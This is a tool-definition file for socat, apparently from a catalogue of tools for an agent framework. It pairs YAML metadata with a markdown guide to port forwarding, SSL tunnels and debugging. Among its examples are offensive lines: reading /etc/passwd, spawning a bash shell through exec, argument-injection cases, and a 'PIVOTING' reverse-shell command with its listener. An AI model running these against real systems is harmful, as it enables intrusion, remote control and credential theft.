---
id: network-socket-socat
namespace: network:socket:socat
name: socat
description: Multipurpose relay tool for bidirectional data transfer between sockets,
  pipes, files, and serial ports with SSL support.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.socket.proxy
  - network.socket.ssl
  - network.socket.relay
  - network.port.redirect
  - network.socket.udp
  - network.serial.connect
  - network.socket.forward
  - security.execution.command
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
  - macos
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - netcat
  - ssh
  - nginx
  - ncat
  - network-socket-nc
artifacts:
  - type: network.socket.data
    description: Data relayed through the socat connection
    mime: text/plain
    trust_level: community
workflow_edges:
  produces:
    - relayed-data
  consumes:
    - source-address
    - target-address
contract:
  inputs:
    - type: network.address.source
      description: Source address specification
    - type: network.address.target
      description: Target address specification
  outputs:
    - type: network.socket.data
      description: Data transferred between endpoints
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - socat
  - Bash
  - execFile

parameters:
  - name: flag-h
    type: array
    required: false
    description: "like -h, plus a list of all common address option names -hhh like
      -hh, plus a list of all available address option names -d[ddd] increase verbosity
      (use up to 4 times; 2 are recommended) -d0|1|2|3|..."
    aliases:
      - -h
      - -?
features:
  - output-json
  - remote
  - network-intensive
  - file-system
  - process-manip
techniques:
  - command-and-control
  - lateral-movement
  - collection
  - execution
  - privilege-escalation
execution:
  template: "socat {flag-h}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: "Simple TCP port forwarder"
    command: "socat TCP-LISTEN:8080,fork TCP:localhost:80"
  - description: "Expose local HTTP server through SSL tunnel"
    command: "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:8080"
  - description: "Create a UNIX socket proxy"
    command: "socat UNIX-LISTEN:/tmp/proxy.sock,fork TCP:remote:3306"
  - description: "Read/write to serial port"
    command: "socat - /dev/ttyUSB0,raw,nonblock,echo=0,crnl"
  - description: "UDP port forward"
    command: "socat UDP-RECVFROM:5000,fork UDP-SENDTO:localhost:6000"
  - description: "Bidirectional relay between two sockets"
    command: "socat TCP:localhost:8080 TCP:remote:9090"
  - description: The command leverages socats ability to relay data, reading arbitary
      file by opening it in read-only mode.
    command: "socat -u OPEN:/etc/passwd,rdonly STDOUT\n"
  - description: The exec argument runs an arbitrary command and spawn a shell.
    command: "socat stdin exec:bash\n"
  - description: The exec argument runs an arbitrary command.
    command: "socat stdin exec:whoami\n"
  - description: 'Argument injection: read local file: The command leverages socats
      ability to relay data, reading arbitary file by opening it in read-only mode.'
    command: socat -u OPEN:/etc/passwd,rdonly STDOUT
  - description: 'Argument injection: spawn interactive shell: The exec argument runs
      an arbitrary command and spawn a shell.'
    command: socat stdin exec:bash
  - description: 'Argument injection: execute arbitrary command: The exec argument
      runs an arbitrary command.'
    command: socat stdin exec:whoami
  - description: 'Darkiros PIVOTING: socat port forwarding listener (on local machine)'
    command: ./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]
  - description: 'Darkiros PIVOTING: socat port forwarding connect (on remote machine)'
    command: socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]
  - description: 'Darkiros PIVOTING: socat reverse shell (remote victime)'
    command: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]
  - description: 'Darkiros PIVOTING: socat reverse shell (local listener)'
    command: socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]
references:
  - label: "Socat documentation"
    url: "http://www.dest-unreach.org/socat/doc/socat.html"
  - label: "Socat examples"
    url: "http://www.dest-unreach.org/socat/doc/socat-multicast.html"
---

# Socat — Multipurpose Socket Relay

Socat (SOcket CAT) is a powerful networking tool that establishes bidirectional data channels between two endpoints. It can connect nearly any type of I/O endpoint: TCP, UDP, SSL, UNIX sockets, pipes, files, serial ports, and executables.

## Address Types

| Type | Syntax | Description |
|------|--------|-------------|
| TCP | `TCP:host:port` | TCP client connection |
| TCP-LISTEN | `TCP-LISTEN:port` | TCP server listener |
| UDP | `UDP:host:port` | UDP datagram |
| UNIX | `UNIX-CONNECT:/path` | UNIX socket client |
| UNIX-LISTEN | `UNIX-LISTEN:/path` | UNIX socket server |
| SSL | `OPENSSL:host:port` | SSL/TLS connection |
| STDIO | `STDIO` | Standard input/output |
| EXEC | `EXEC:cmd` | Execute a program |
| FILE | `FILE:/path` | Open a file |
| SERIAL | `/dev/ttyUSB0` | Serial port |

## Common Patterns

### Port Forwarding
```bash
# Forward local port to remote
socat TCP-LISTEN:8080,reuseaddr,fork TCP:remote-server:80

# WITH SSL (decrypt at proxy)
socat TCP-LISTEN:8443,reuseaddr,fork OPENSSL:backend:443
```

### Network Debugging
```bash
# Echo server for testing
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:cat

# Hex dump of traffic
socat -v TCP-LISTEN:8080,fork TCP:localhost:80
```

### Security
```bash
# SSL-terminated port forward
socat OPENSSL-LISTEN:443,cert=fullchain.pem,key=privkey.pem,verify=0,fork TCP:localhost:8080

# Encrypted tunnel between two machines
socat TCP-LISTEN:4443,reuseaddr TCP:localhost:4444
```

## Related Tools

- **[netcat (nc)](../socket/nc.md)** — Simple socket connections
- **[ncat](../../socket/ncat.md)** — Modern netcat with SSL
- **[ssh](../../remote/ssh.md)** — Encrypted tunneling with authentication
- **[haproxy](../../proxy/haproxy.md)** — Production-grade TCP/HTTP proxy
